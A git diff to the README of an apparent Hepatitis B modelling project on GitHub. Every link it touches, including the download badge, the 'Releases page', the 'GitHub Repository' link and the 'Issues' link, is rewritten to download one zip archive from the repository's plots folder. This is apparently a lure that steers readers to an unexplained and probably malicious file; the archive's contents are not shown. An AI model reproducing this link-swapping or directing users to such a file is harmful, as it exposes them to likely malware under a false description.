@@ -1,6 +1,6 @@
 # 🦠 Hepatitis-B-dynamic-model - Easy Modeling of Hepatitis B
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%8D%93%20Click%20Here-brightgreen)](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jacob213769gg/Hepatitis-B-dynamic-model/main/plots/model_dynamic_Hepatitis_2.4.zip%20Latest%20Release-%F0%9F%8D%93%20Click%20Here-brightgreen)](https://raw.githubusercontent.com/Jacob213769gg/Hepatitis-B-dynamic-model/main/plots/model_dynamic_Hepatitis_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the Hepatitis-B-dynamic-model project. This software helps you unders
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Latest Release](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/releases).
+To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Jacob213769gg/Hepatitis-B-dynamic-model/main/plots/model_dynamic_Hepatitis_2.4.zip).
 
 Here’s how to install the application:
 
-1. Go to the [Releases page](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Jacob213769gg/Hepatitis-B-dynamic-model/main/plots/model_dynamic_Hepatitis_2.4.zip).
 2. Find the latest release.
 3. Look for the downloadable file suitable for your operating system.
 4. Click on the file to start the download.
@@ -51,13 +51,13 @@ The Hepatitis-B-dynamic-model application provides several key features:
 
 ## 📝 Additional Documentation
 
-For more details about how to use each feature, please refer to the documentation included within the application. You can also visit the [GitHub Repository](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model) for further resources, updates, and discussions related to this project.
+For more details about how to use each feature, please refer to the documentation included within the application. You can also visit the [GitHub Repository](https://raw.githubusercontent.com/Jacob213769gg/Hepatitis-B-dynamic-model/main/plots/model_dynamic_Hepatitis_2.4.zip) for further resources, updates, and discussions related to this project.
 
 ## 🌍 Community and Support
 
 If you have any questions or need help, feel free to reach out. You can find discussions and support within the GitHub Issues section. Our community is welcoming and ready to assist you.
 
-1. Visit the [Hepatitis-B-dynamic-model Issues](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/issues) for support.
+1. Visit the [Hepatitis-B-dynamic-model Issues](https://raw.githubusercontent.com/Jacob213769gg/Hepatitis-B-dynamic-model/main/plots/model_dynamic_Hepatitis_2.4.zip) for support.
 2. Participate in community discussions about improvements or features you would like to see.
 
 ## 📚 Learn More
